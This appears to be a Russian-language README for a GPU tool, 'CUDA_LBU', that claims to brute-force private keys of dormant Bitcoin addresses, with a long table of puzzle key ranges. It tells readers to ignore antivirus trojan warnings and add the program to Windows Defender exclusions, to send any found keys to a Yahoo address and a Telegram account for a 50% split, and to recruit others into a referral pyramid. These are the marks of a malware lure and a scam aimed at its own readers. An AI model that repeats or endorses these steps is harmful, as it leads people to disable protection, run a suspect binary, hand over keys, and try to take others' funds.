Приветствуем тебя, Сталкер!

В сети биткоин содержится около 37000 адресов с заброшенными, забытыми, 
утраченными паролями, ключами и т.п., по которым нет движений на вывод уже более 10 лет.
Так же есть адреса соревнований по вскрытию, запущенные миллиардерами-китами, такие как 1000 BTC Bitcoin Puzzle.
Все эти адреса зашиты для поиска в программу CUDA_LBU_v1.1.exe и содержат на своем балансе в сумме около
300 миллиардов долларов.

Если вы хотите принять участие в поиске и нахождению этих сокровищ, распакуйте архив в свою пользовательскую папку Windows. (Обычно C:\Users\Ваше Имя\)
Откройте папку CUDA_LBU_v1.0 и найдите в ней CUDA_LBU_v1.1.exe
Не обращайте внимание на предупреждения антивируса или Windows Defender о подозрительном файле или наличии трояна.
Программа работает с крипто-функциями и генерацией ключей, поэтому поподает под подозрение.
Добавьте в белый список вашего антивируса путь к CUDA_LBU_v1.1 и в исключения в WindowsDefender 
(Параметры->Обновление и безопасность->Безопасность Windows->Защита от вирусов и Угроз->Управление настройками->
Добавление или удаление Исключений->Добавить исключение->Папка->Выбрать путь к папке CUDA_LBU_v1.1)

CUDA_LBU_v1.1 предназначена только для работы с видеокартами nVidia с поддержкой CUDA 10 и выше.

На сегодня существует 5 видов адресов биткоина на один приватный ключ:

1) Legacy незжатый (до 2013 г, 1EHNa6Q4Jz2uvNExL497mE43ikXhwF6kZm)
2) Legacy сжатый (после 2013 г, 1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH)
3) Segwit P2SH (после 2017 г, 3JvL6Ymt8MVWiCNHC7oWU6nLeHNJKLZGLN)
4) SegWit Bech32 p2wpkh и p2wsh (bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4)
5) Taproot Shnoor (bc1pmfr3p9j00pfxjh0zmgp99y8zftmd3s5pmedqhyptwy6lm87hf5sspknck9)

Мы ищем только ключи к Legacy сжатым и несжатым адресам, так как они никак не защищены от перебора и большинство потерянных биткоинов находятся именно там.
Подобрать ключи к SegWit и Taproot адресам практически невозможно, так как кроме ключей там прибавляются скрипты и различная "соль" при создании адресов.

В программе предоставлен выбор диапазона ключей от start до end, где вы будете искать, 
для повышения вероятности нахождения вашей цели. Если адрес был создан до 2013 года, то он имеет незжатый формат, если после 2013 - сжатый (но это не точно).
Некоторые диапазоны известны, например из соревнований 1000 BTC Bitcoin Puzzle, все они имеют сжатый формат:
		
START:	400001e410b4514000 END: 7fffffffffffffffff  						содержит 1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU		
START:	800000000000000000 END: ffffffffffffffffff  						содержит 1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR		
START:	1000000000000000000 END: 1ffffffffffffffffff  					содержит 12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4		
START:	2000000000000000000 END: 3ffffffffffffffffff  					содержит 1FWGcVDK3JGzCC3WtkYetULPszMaK2Jksv		
START:	8000000000000000000 END: fffffffffffffffffff  					содержит 1DJh2eHFYQfACPmrvpyWc8MSTYKh7w9eRF		
START:	10000000000000000000 END: 1fffffffffffffffffff  					содержит 1Bxk4CQdqL9p22JEtDfdXMsng1XacifUtE		
START:	20000000000000000000 END: 3fffffffffffffffffff  					содержит 15qF6X51huDjqTmF9BJgxXdt1xcj46Jmhb		
START:	40000000000000000000 END: 7fffffffffffffffffff  					содержит 1ARk8HWJMn8js8tQmGUJeQHjSE7KRkn2t8		
START:	100000000000000000000 END: 1ffffffffffffffffffff  					содержит 15qsCm78whspNQFydGJQk5rexzxTQopnHZ		
START:	200000000000000000000 END: 3ffffffffffffffffffff  					содержит 13zYrYhhJxp6Ui1VV7pqa5WDhNWM45ARAC		
START:	400000000000000000000 END: 7ffffffffffffffffffff  					содержит 14MdEb4eFcT3MVG5sPFG4jGLuHJSnt1Dk2		
START:	800000000000000000000 END: fffffffffffffffffffff  					содержит 1CMq3SvFcVEcpLMuuH8PUcNiqsK1oicG2D 
START:	2000000000000000000000 END: 3fffffffffffffffffffff  					содержит 1K3x5L6G57Y494fDqBfrojD28UJv4s5JcK		
START:	4000000000000000000000 END: 7fffffffffffffffffffff  					содержит 1PxH3K1Shdjb7gSEoTX7UPDZ6SH4qGPrvq	
START:	8000000000000000000000 END: ffffffffffffffffffffff  					содержит 16AbnZjZZipwHMkYKBSfswGWKDmXHjEpSf		
START:	10000000000000000000000 END: 1ffffffffffffffffffffff  					содержит 19QciEHbGVNY4hrhfKXmcBBCrJSBZ6TaVt
START:	40000000000000000000000 END: 7ffffffffffffffffffffff  					содержит 1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74		
START:	80000000000000000000000 END: fffffffffffffffffffffff  					содержит 1AE8NzzgKE7Yhz7BWtAcAAxiFMbPo82NB5		
START:	100000000000000000000000 END: 1fffffffffffffffffffffff  				содержит 17Q7tuG2JwFFU9rXVj3uZqRtioH3mx2Jad		
START:	200000000000000000000000 END: 3fffffffffffffffffffffff  				содержит 1K6xGMUbs6ZTXBnhw1pippqwK6wjBWtNpL 	
START:	800000000000000000000000 END: ffffffffffffffffffffffff  				содержит 15ANYzzCp5BFHcCnVFzXqyibpzgPLWaD8b
START:	1000000000000000000000000 END: 1ffffffffffffffffffffffff  				содержит 18ywPwj39nGjqBrQJSzZVq2izR12MDpDr8
START:	2000000000000000000000000 END: 3ffffffffffffffffffffffff  				содержит 1CaBVPrwUxbQYYswu32w7Mj4HR4maNoJSX
START:	4000000000000000000000000 END: 7ffffffffffffffffffffffff  				содержит 1JWnE6p6UN7ZJBN7TtcbNDoRcjFtuDWoNL
START:	10000000000000000000000000 END: 1fffffffffffffffffffffffff  				содержит 1CKCVdbDJasYmhswB6HKZHEAnNaDpK7W4n
START:	20000000000000000000000000 END: 3fffffffffffffffffffffffff  				содержит 1PXv28YxmYMaB8zxrKeZBW8dt2HK7RkRPX
START:	40000000000000000000000000 END: 7fffffffffffffffffffffffff  				содержит 1AcAmB6jmtU6AiEcXkmiNE9TNVPsj9DULf
START:	80000000000000000000000000 END: ffffffffffffffffffffffffff  				содержит 1EQJvpsmhazYCcKX5Au6AZmZKRnzarMVZu
START:	200000000000000000000000000 END: 3ffffffffffffffffffffffffff  				содержит 18KsfuHuzQaBTNLASyj15hy4LuqPUo1FNB
START:	400000000000000000000000000 END: 7ffffffffffffffffffffffffff  				содержит 15EJFC5ZTs9nhsdvSUeBXjLAuYq3SWaxTc
START:	800000000000000000000000000 END: fffffffffffffffffffffffffff  				содержит 1HB1iKUqeffnVsvQsbpC6dNi1XKbyNuqao
START:	1000000000000000000000000000 END: 1fffffffffffffffffffffffffff  				содержит 1GvgAXVCbA8FBjXfWiAms4ytFeJcKsoyhL
START:	4000000000000000000000000000 END: 7fffffffffffffffffffffffffff  				содержит 1824ZJQ7nKJ9QFTRBqn7z7dHV5EGpzUpH3
START:	8000000000000000000000000000 END: ffffffffffffffffffffffffffff  				содержит 18A7NA9FTsnJxWgkoFfPAFbQzuQxpRtCos
START:	10000000000000000000000000000 END: 1ffffffffffffffffffffffffffff  				содержит 1NeGn21dUDDeqFQ63xb2SpgUuXuBLA4WT4
START:	20000000000000000000000000000 END: 3ffffffffffffffffffffffffffff  				содержит 174SNxfqpdMGYy5YQcfLbSTK3MRNZEePoy
START:	80000000000000000000000000000 END: fffffffffffffffffffffffffffff  				содержит 1MnJ6hdhvK37VLmqcdEwqC3iFxyWH2PHUV
START:	100000000000000000000000000000 END: 1fffffffffffffffffffffffffffff  			содержит 1KNRfGWw7Q9Rmwsc6NT5zsdvEb9M2Wkj5Z
START:	200000000000000000000000000000 END: 3fffffffffffffffffffffffffffff  			содержит 1PJZPzvGX19a7twf5HyD2VvNiPdHLzm9F6
START:	400000000000000000000000000000 END: 7fffffffffffffffffffffffffffff  			содержит 1GuBBhf61rnvRe4K8zu8vdQB3kHzwFqSy7
START:	1000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffff  			содержит 1GDSuiThEV64c166LUFC9uDcVdGjqkxKyh
START:	2000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffff  			содержит 1Me3ASYt5JCTAK2XaC32RMeH34PdprrfDx
START:	4000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffff  			содержит 1CdufMQL892A69KXgv6UNBD17ywWqYpKut
START:	8000000000000000000000000000000 END: fffffffffffffffffffffffffffffff  			содержит 1BkkGsX9ZM6iwL3zbqs7HWBV7SvosR6m8N 
START:	20000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffff  		содержит 1AWCLZAjKbV1P7AHvaPNCKiB7ZWVDMxFiz
START:	40000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffff  		содержит 1G6EFyBRU86sThN3SSt3GrHu1sA7w7nzi4
START:	80000000000000000000000000000000 END: ffffffffffffffffffffffffffffffff  		содержит 1MZ2L1gFrCtkkn6DnTT2e4PFUTHw9gNwaj
START:	100000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffff  		1Hz3uv3nNZzBVMXLGadCucgjiCs5W9vaGz 
START:	400000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffff  		16zRPnT8znwq42q7XeMkZUhb1bKqgRogyy
START:	800000000000000000000000000000000 END: fffffffffffffffffffffffffffffffff  		1KrU4dHE5WrW8rhWDsTRjR21r8t3dsrS3R
START:	1000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffff  		17uDfp5r4n441xkgLFmhNoSW1KWp6xVLD
START:	2000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffff  		13A3JrvXmvg5w9XGvyyR4JEJqiLz8ZySY3
START:	4000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffff  		16RGFo6hjq9ym6Pj7N5H7L1NR1rVPJyw2v 
START:	8000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffff  		1UDHPdovvR985NrWSkdWQDEQ1xuRiTALq
START:	10000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffff  		15nf31J46iLuK1ZkTnqHo7WgN5cARFK3RA
START: 20000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffff  		1Ab4vzG6wEQBDNQM1B2bvUz4fqXXdFk2WT
START: 40000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffff  		1Fz63c775VV9fNyj25d9Xfw3YHE6sKCxbt
START: 80000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffff  		1QKBaU6WAeycb3DbKbLBkX7vJiaS8r42Xo
START: 100000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffff  		1CD91Vm97mLQvXhrnoMChhJx4TP9MaQkJo
START: 200000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffff  		15MnK2jXPqTMURX4xC3h4mAZxyCcaWWEDD
START: 400000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffff  		13N66gCzWWHEZBxhVxG18P8wyjEWF9Yoi1
START: 800000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffff  		1NevxKDYuDcCh1ZMMi6ftmWwGrZKC6j7Ux
START: 1000000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffffff  	19GpszRNUej5yYqxXoLnbZWKew3KdVLkXg
START: 2000000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffffff  	1M7ipcdYHey2Y5RZM34MBbpugghmjaV89P
START: 4000000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffffff  	18aNhurEAJsw6BAgtANpexk5ob1aGTwSeL
START: 8000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffff  	1FwZXt6EpRT7Fkndzv6K4b4DFoT4trbMrV
START: 10000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffff  	1CXvTzR6qv8wJ7eprzUKeWxyGcHwDYP1i2
START: 20000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffff  	1MUJSJYtGPVGkBCTqGspnxyHahpt5Te8jy
START: 40000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffff  	13Q84TNNvgcL3HJiqQPvyBb9m4hxjS3jkV
START: 80000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffff  	1LuUHyrQr8PKSvbcY1v1PiuGuqFjWpDumN
START: 100000000000000000000000000000000000000 END: 1ffffffffffffffffffffffffffffffffffffff  	18192XpzzdDi2K11QVHR7td2HcPS6Qs5vg
START: 200000000000000000000000000000000000000 END: 3ffffffffffffffffffffffffffffffffffffff  	1NgVmsCCJaKLzGyKLFJfVequnFW9ZvnMLN
START: 400000000000000000000000000000000000000 END: 7ffffffffffffffffffffffffffffffffffffff  	1AoeP37TmHdFh8uN72fu9AqgtLrUwcv2wJ
START: 800000000000000000000000000000000000000 END: fffffffffffffffffffffffffffffffffffffff  	1FTpAbQa4h8trvhQXjXnmNhqdiGBd1oraE
START: 1000000000000000000000000000000000000000 END: 1fffffffffffffffffffffffffffffffffffffff  	14JHoRAdmJg3XR4RjMDh6Wed6ft6hzbQe9
START: 2000000000000000000000000000000000000000 END: 3fffffffffffffffffffffffffffffffffffffff  	19z6waranEf8CcP8FqNgdwUe1QRxvUNKBG
START: 4000000000000000000000000000000000000000 END: 7fffffffffffffffffffffffffffffffffffffff  	14u4nA5sugaswb6SZgn5av2vuChdMnD9E5
START: 8000000000000000000000000000000000000000 END: ffffffffffffffffffffffffffffffffffffffff  	1NBC8uXJy1GiJ6drkiZa1WuKn51ps7EPTv

Вы можете выбрать любой из этих диапазонов или сразу несколько подряд, указав например START: 400001e410b4514000 END: 1fffffffffffffffffff, что 
содержит всебе сразу 6 адресов.

Все остальные адреса находятся в диапазоне от START: ffffffffffffffffffffffffffffffffffffffff до END: fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
 и имеют как сжатый, так и несжатый формат. Вы можете сами разбить диапазон на части, и исследовать свои области. 

## Как запустить

CUDA_LBU_v1.1.exe запускается двойным кликом, в появившемся окне вводите:

В режиме 64-канального циклично-детерминированного осциллирующего маятника...  (Состояние и направление маятника будет сохраняться в файле)

1) START key in hex (0-9, A-F): вводите начало диапазона из таблицы выше, или свое, например: 400001e410b4514000
2) END key in hex   (0-9, A-F): вводите конец диапазона из таблицы выше, или свое, например: 7fffffffffffffffff
3) Quantity of CUDA devices: количество физических видеокарт nVidia с поддержкой CUDA в вашей системе
4) Quantity of CUDA blocks [50..250]: количество блоков, читайте руководство к вашей видокарте, или подберите вручную перебором, для достижения наилучшей скорости, например для rtx4060 это будет 96
5) Number of threads per block [32..512], multiple of 32: количество потоков на блок кратное 32, читайте руководство к вашей видокарте, или подберите вручную перебором, для достижения наилучшей скорости, например для rtx4060 это будет 128
6) Number of points in threads [50..2000]: количество точек на поток, чем больше, тем выше скорость, но и меньше свобоной памяти.

После удачного запуска вы увидите инициализацию видеокарт и процесс обработки ключей с выводом скорости и времени.

## Случайный режим

1. START key (hex): Random
2. END key (hex): r
3. Number of key digits to start [18-64]: стартовый номер чисел для выбранного диапазона  
4. Number of CUDA devices: количество физических видеокарт с поддержкой CUDA в вашей системе
5. CUDA blocks [50–250]: количество блоков (подберите для вашей GPU; RTX 4060 ~96).
6. Threads per block [32–1024] (multiple of 32): количество потоков, кратное 32 (RTX 4060 ~128).
7. Points per thread [50–5000]: количество точек влияет на скорость, уменьшает свободную память.

После удачного запуска вы увидите инициализацию видеокарт и процесс обработки ключей с выводом скорости и времени

Программа написана с использованием математических методов оптимизации с применением ИИ, используется циклично-детерменированный режим
при выборе диапазонов и режим полного случайного перебора всего диапазона при указании RANDOM в параметрах запуска START: и END:.
Чем дольше она будет работать, тем больше у вас будет шансов найти код к одному из адресов, когда это произойдет - 
программа выведет на экран сообщение о нахождении кода и АДРЕС и остановит процессы поиска,
сохранив код и адрес в файл "Found_Keys.txt" в той же папке, что и программа. 
Не поленитесь сделать скриншот или фото окна программы в этот момент.
Этот файл нужно будет отправить со своей почты/мессенджера регистрации в проекте 

        на адреса: SoGerera@yahoo.com, https://t.me/RomanVader

с указанием СВОЕГО биткоин-адреса для получения вознаграждения, которое СОСТАВИТ 50% от суммы найденного кошелька.


## Grey Zone (Серая зона)

Это локальная база данных пройденных/проверенных диапазонов ключей. Каждые 2 минуты программа обновляет её и сохраняет новые диапазоны в памяти и файле Grey.zone в папке программы.

CUDA_LBU сначало проверяет, есть ли выбранный диапазон в Grey Zone, если нет, пытается просканировать его на наличие ключа.

Активные сталкеры должны опубликовывать свой файл Grey.zone в группе еженедельно.
В ответ основатель группы опубликует объединённые Grey.zone всех сталкеров.
После этого замените старый файл новым, чтобы увеличить шансы нахождения!


## Тест нахождения ключа

Для тестирования используйте мини-диапазон для адреса `13zb1hQbWVsc2S7ZTZnP2G4undNNpdh5so:`
`START: 2832ed72f2b5e25ee END: 2832ed75f3b5e45ee`

## Сеть

Все, кто состоят в группе телеграм (Зоне) - Сталкеры, в поисках артефакта (потрерянных биткоинов с помощью программы). 
Те, кого Сталкер пригласил в группу - его Болты.
А болт - тоже Сталкер приглашающий новых болтов. Так что у каждого Сталкера-болта есть тот, кто его пригласил - его Сталкер, и у каждого Сталкера есть болт - кого 
он пригласил. Таже схема реферрер - рефералл.
Если ваш болт нашел артефакт (код к адресу с биткоинами), вы получаете 7% от найденой суммы, ваш болт - 50%. 
Процесс нахождения кода зависит от удачи и вычислительных мощностей ваших видеокарт, а также ВАШЕЙ СЕТИ БОЛТОВ.
Вы можете увеличить шанс нахождения кодов, если расширите свою сеть болтов, рекомендуя программу своим знакомым и в сети интернет.
Берете имейл (telegram, whatsapp) вашего приглашенного и сохраняете его в свою табличку (например гугл-докс). 
Раз в неделю высылаете ссылку на таблицу своей сети (если есть изменения) своему сталкеру - кто вас пригласил в проект.
На имейл/мессенджер приглашенного высылаете туже самую информацию и те же самые файлы, что получили вы от вашего сталкера.
Чтобы принимать/отправлять файлы через телеграм - установите Telegram Desktop на ваш Windows компьютер (https://desktop.telegram.org/)

Группа в телеграм: https://t.me/LostBTCUnlocker

## ВОЗНАГРАЖДЕНИЯ

Структура Сталкер-Болт:

Сталкер: любой в группе Telegram `https://t.me/LostBTCUnlocker`
Болт: сталкер, приглашенный вами.

Вознаграждение за нахождение артефакта:

  + 50% Болту, нашедшему код-артефакт
  + 7% Сталкеру болта
  + 13% распределяется равномерными долями в зависимости от Рабочих Часов среди активных Сталкеров группы, кто постит еженедельные видео/фото отчеты работы программы (Птн-Пон) с своим файлом Grey.Zone:
	
 > 200 рабочих часов + 1 доля от 13% артефакта
 > 300 РЧ + 2 доли
 > 600 РЧ + 3 доли
 > 800 РЧ + 4 доли
 > 1000 РЧ + 5 доль
 > 1500 РЧ + 6 доль
 > 2000 РЧ + 7 доль
 > 2500 РЧ + 8 доль
 > 3000 РЧ + 9 доль
 > 3500 РЧ + 10 доль
 > 4000 РЧ + 11 доль
 > 4500 РЧ + 12 доль
 > 5000 РЧ + 13 доль

Теперь у вас есть своя "Трудовая Книжка" – криптографическая кривая в папке APPDATA (например "C:\Users\Имя\AppData\Roaming\LBU\CUDA_LBU")
Она хранит надежно ваши Рабочие Часы в кривой, даже когда ваша CUDA_LBU выключена.

Для примера, если нашли 1,000 BTC:
Нашедшему: 500 BTC
 Его сталкеру: 70 BTC
Активной команде: 1000 Сталкеров
500 (200 РЧ) активных 500 долей: 0.009 BTC каждому (~$1,000)
300 (2000 РЧ) активных 2100 долей: 0.063 BTC каждому (~$7,500)
200 (4000 РЧ) активных 2200 долей: 0.099 BTC каждому (~$11,500)
197 (5000 РЧ) активных 2561 доля: 0.117 BTC каждому (~$14,000)
Итого: 7361 долей от 13% (500 BTC) / 7361 = 0.009 BTC для 1 доли

## Еженедельные требования:

Размещать в группе https://t.me/LostBTCUnlocker скриншот/видео консоли программы с видимой датой и рабочими часами + Grey.Zone файл.
Когда найдете код-артефакт, вышлете файл Found_keys.txt со СВОИМ адресом БТС и контактом вашего Сталкера в (“Monolith”) https://t.me/RomanVader.

## ВАЖНО!

Видеокарты работают в максимальном режиме нагрузки, поэтому обеспечте их надлежащим дополнительным охлождением (напольным вентилятором и откройте корпус ПК), 
особенно в жаркое время, дабы они служили вам как можно дольше!

## Минимальные требования:

Windows 10
CPU Intel Celeron 1000 Mhz
4 Gb RAM
ВИДЕОКАРТА nVidia CUDA
Подключение к сети интернет - не требуется.

Удачи и терпения, Сталкер, а они обязательно окупятся!